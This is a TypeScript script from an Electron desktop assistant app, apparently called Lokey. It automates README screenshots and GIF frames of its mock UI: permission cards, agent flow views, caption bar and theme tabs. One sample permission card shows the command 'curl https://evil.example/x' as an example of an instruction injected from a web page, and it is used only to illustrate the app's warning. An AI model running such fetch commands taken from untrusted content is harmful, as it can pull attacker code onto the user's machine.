import { mkdirSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import type { BrowserWindow } from 'electron'
import { captionBar } from './agent/overlays'

// `lokey --mock --shots <dir>`: README art. Drives the island through its zustand store (no OS input, no focus) with
// the renderer on the built-in mock bridge (fake media, clipboard, apps), so no personal data can end up in an image.
// Writes stills (dark and light) and timed frame sequences with an ffconcat list for the GIFs.
const sleep = (ms: number) => new Promise(r => setTimeout(r, ms))

/** `--mock --shots <dir> --askshots [--edge E] [--theme T]`: the request card in every state on a grey backdrop (no input, no focus, no main-process asks) */
async function runAskShots(win: BrowserWindow, dir: string, done: () => void) {
  const wc = win.webContents
  const js = <T = unknown>(code: string) => wc.executeJavaScript(code) as Promise<T>
  mkdirSync(dir, { recursive: true })
  const argv = process.argv
  const val = (f: string, d: string) => { const i = argv.indexOf(f); return i >= 0 && argv[i + 1] ? argv[i + 1] : d }
  const tag = `${val('--edge', 'top')}-${val('--theme', 'dark')}`
  const cards: [string, object, number][] = [
    ['plain', { id: 'a1', title: 'Open Calculator', detail: 'Starts the Calculator app.', tool: 'open_app', timeoutMs: 30000 }, 0],
    ['send', { id: 'a2', title: 'Send: Message Amma "on my way"', detail: 'WhatsApp. First time sending to +91 98xxx xxxxx. This cannot be undone.', tool: 'send_message', cls: 'send', timeoutMs: 30000 }, 2],
    ['source', { id: 'a3', title: 'Run: curl https://evil.example/x', detail: 'This address came from a web page, not from you. This cannot be undone.', tool: 'run_command', cls: 'run', src: 'a web page', timeoutMs: 30000 }, 0],
    ['long', { id: 'a4', title: 'Delete: move 214 files from Downloads to the Recycle Bin and empty the old installers folder', detail: 'D:\\Downloads\\old\\installer-1.exe, installer-2.exe, installer-3.exe and 211 more. Lokey read the file list from a mail attachment just before this, and it is not you. This touches more than 20 items and cannot be undone, so it needs your answer.', tool: 'delete_file', cls: 'delete', src: 'a mail', timeoutMs: 30000 }, 1],
    ['handoff', { id: 'a5', title: 'Your turn', detail: 'This looks like a login or verification screen. I never type passwords, codes or card details. Do it yourself, then press "I\'m done".', tool: 'type_text', kind: 'handoff', timeoutMs: 120000 }, 0],
    ['expiring', { id: 'a6', title: 'Open Notepad', detail: '', tool: 'open_app', timeoutMs: 30000 }, 0],
  ]
  try {
    await new Promise(r => setTimeout(r, 3500))
    await js(`document.body.style.background = '#7d828c'; document.documentElement.style.background = '#7d828c'`)
    await js(`window.__demoBridge?.settings.set({ appearance: { theme: ${JSON.stringify(val('--theme', 'dark'))} } })`)
    await new Promise(r => setTimeout(r, 900))
    for (const [name, c, more] of cards) {
      const left = name === 'expiring' ? 6000 : 24000
      await js(`window.__ask.set({ cur: { ...${JSON.stringify(c)}, expiresAt: Date.now() + ${left} }, more: ${more} })`)
      await new Promise(r => setTimeout(r, 1300))
      writeFileSync(join(dir, `ask-${tag}-${name}.png`), (await wc.capturePage()).toPNG())
      await js('window.__ask.set({ cur: null, more: 0 })')
      await new Promise(r => setTimeout(r, 800))
    }
  } catch (e) { writeFileSync(join(dir, `error-${tag}.txt`), String(e)) }
  done()
}

/** `--mock --shots <dir> --flowshots [--edge E] [--theme T]`: the Flow (Agents) tab with a busy and an idle scenario, and a node's detail sheet (no input, no focus) */
async function runFlowShots(win: BrowserWindow, dir: string, done: () => void) {
  const wc = win.webContents
  const js = <T = unknown>(code: string) => wc.executeJavaScript(code) as Promise<T>
  mkdirSync(dir, { recursive: true })
  const argv = process.argv
  const val = (f: string, d: string) => { const i = argv.indexOf(f); return i >= 0 && argv[i + 1] ? argv[i + 1] : d }
  const tag = `${val('--edge', 'top')}-${val('--theme', 'dark')}`
  const shot = async (name: string) => writeFileSync(join(dir, `flow-${tag}-${name}.png`), (await wc.capturePage()).toPNG())
  try {
    await sleep(3500)
    await js(`window.__demoBridge?.settings.set({ appearance: { theme: ${JSON.stringify(val('--theme', 'dark'))} } })`)
    await sleep(900)
    await js(`window.__todos?.getState().add('Buy printer ink @18:30'); window.__todos?.getState().add('Book dentist')`)
    const pick = (t: string) => js(`[...document.querySelectorAll('.lk-fl-card')].find(b => b.textContent.includes(${JSON.stringify(t)}))?.click()`)
    const scene = async (s: string) => { await js(`window.__agentsGraph.set(${JSON.stringify(s)})`); await sleep(1300) }
    await js("window.__agentsGraph.set('rich'); window.__island.getState().openMenu('agents', 'hover')")
    await sleep(1600)
    await shot('rich')
    await sleep(900)
    await shot('rich2')
    await pick(val('--pick', 'standing desks'))
    await sleep(600)
    await shot('sheet')
    await pick(val('--pick', 'standing desks'))
    await sleep(300)
    await pick('FreeLLMAPI')
    await sleep(600)
    await shot('sheet-engine')
    await pick('FreeLLMAPI')
    await scene('attention')
    await shot('attention')
    await scene('many')
    await shot('many')
    await js("window.__agentsGraph.set('empty'); window.__todos?.setState({ items: [] })")
    await sleep(1400)
    await shot('empty')
  } catch (e) { writeFileSync(join(dir, `error-${tag}.txt`), String(e)) }
  done()
}

/** `--mock --shots <dir> --captionshots`: the real caption bar window (click-through, never focused) shows a said line, a reply, a notice and then clears: stills of each and a check that the window closes */
async function runCaptionShots(dir: string, done: () => void) {
  mkdirSync(dir, { recursive: true })
  const log: string[] = []
  const shot = async (name: string) => { const img = await captionBar.capture().catch(() => null); if (img) writeFileSync(join(dir, 'caption-' + name + '.png'), img.toPNG()); log.push(name + ': ' + (img ? 'captured' : 'NO WINDOW')) }
  try {
    await sleep(1500)
    captionBar.send({ kind: 'said', text: 'open chrome and search for the weather', label: 'You', tone: 'info' }); await sleep(1800); await shot('said')
    captionBar.send({ kind: 'reply', text: 'Opening Chrome now.', label: 'Lokey', tone: 'info' }); await sleep(1500); await shot('reply')
    captionBar.send({ kind: 'notice', text: 'Waiting: Gemini Flash hit its daily limit. I will carry on at 6:30 PM.', label: 'Lokey', tone: 'info' }); await sleep(1500); await shot('notice')
    captionBar.send({ kind: 'clear' }); captionBar.closeSoon(700); await sleep(1500)
    log.push('after clear: ' + (captionBar.isOpen ? 'STILL OPEN' : 'closed'))
  } catch (e) { log.push(String(e)) }
  writeFileSync(join(dir, 'caption-log.txt'), log.join(String.fromCharCode(10)))
  done()
}

export async function runShots(win: BrowserWindow, dir: string, done: () => void) {
  if (process.argv.includes('--captionshots')) return runCaptionShots(dir, done)
  if (process.argv.includes('--askshots')) return runAskShots(win, dir, done)
  if (process.argv.includes('--flowshots')) return runFlowShots(win, dir, done)
  const wc = win.webContents
  const js = <T = unknown>(code: string) => wc.executeJavaScript(code) as Promise<T>
  mkdirSync(dir, { recursive: true })
  const png = async () => (await wc.capturePage()).toPNG()
  const still = async (name: string) => writeFileSync(join(dir, `${name}.png`), await png())
  const open = (view: string) => js(`window.__island.getState().openMenu(${JSON.stringify(view)}, 'hover')`)
  const closeMenu = () => js('window.__island.getState().closeMenu()')
  const theme = (t: 'dark' | 'light') => js(`window.__demoBridge.settings.set({ appearance: { theme: ${JSON.stringify(t)} } })`)
  // opens the view and only takes the picture once the island really is that menu (retries if a transition swallowed the call)
  const tab = async (name: string, view: string, wait = 1100) => {
    for (let i = 0; i < 4; i++) {
      await open(view)
      await sleep(wait + i * 400)
      const st = await js<{ shape: string; view: string }>('(() => { const s = window.__island.getState(); return { shape: s.shape, view: s.view } })()')
      if (st.shape === 'menu' && st.view === view) break
    }
    await still(name)
  }

  /** captures as fast as the machine allows while `script` runs; writes frames + an ffconcat file with real timings */
  async function record(name: string, script: () => Promise<void>) {
    const d = join(dir, name)
    mkdirSync(d, { recursive: true })
    const stamps: number[] = []
    let stop = false
    const t0 = Date.now()
    const loop = (async () => {
      for (let i = 0; !stop; i++) {
        writeFileSync(join(d, `${String(i).padStart(4, '0')}.png`), await png())
        stamps.push(Date.now() - t0)
      }
    })()
    await script()
    stop = true
    await loop
    const lines = ['ffconcat version 1.0']
    stamps.forEach((t, i) => { lines.push(`file '${String(i).padStart(4, '0')}.png'`, `duration ${(((stamps[i + 1] ?? t + 150) - t) / 1000).toFixed(3)}`) })
    lines.push(`file '${String(stamps.length - 1).padStart(4, '0')}.png'`)
    writeFileSync(join(d, 'frames.txt'), lines.join('\n'))
  }

  try {
    await sleep(3500)
    await theme('dark')
    await sleep(900)
    await still('sleep')
    await js("window.__island.getState().wake('hover')")
    await sleep(1300)
    await still('awake')
    await tab('music', 'music')
    for (const [n, v] of [['controls', 'controls'], ['today', 'today'], ['stats', 'stats'], ['clipboard', 'clipboard'], ['apps', 'apps'], ['wallpaper', 'wallpaper'], ['power', 'power'], ['wifi', 'wifi'], ['bluetooth', 'bluetooth'], ['audio', 'audio']] as const) await tab(n, v, n === 'stats' || n === 'wallpaper' ? 1700 : 1100)
    await closeMenu()
    await sleep(900)

    // light theme stills
    await theme('light')
    await sleep(1200)
    for (const [n, v] of [['light-controls', 'controls'], ['light-today', 'today'], ['light-clipboard', 'clipboard'], ['light-apps', 'apps']] as const) await tab(n, v, 1100)
    await closeMenu()
    await theme('dark')
    await sleep(1000)

    // hero reel: wake, music island, tour of the tabs, close
    await record('hero', async () => {
      await sleep(400)
      await js("window.__island.getState().wake('hover')"); await sleep(1500)
      await open('music'); await sleep(1500)
      for (const v of ['controls', 'today', 'stats', 'clipboard', 'apps', 'wallpaper']) { await open(v); await sleep(v === 'stats' ? 1700 : 1300) }
      await closeMenu(); await sleep(1400)
    })
    // theme flip while the menu is open
    await record('theme', async () => {
      await open('controls'); await sleep(900)
      await theme('light'); await sleep(1800)
      await theme('dark'); await sleep(1800)
      await closeMenu(); await sleep(500)
    })
  } catch (e) {
    writeFileSync(join(dir, 'error.txt'), String(e))
  }
  done()
}
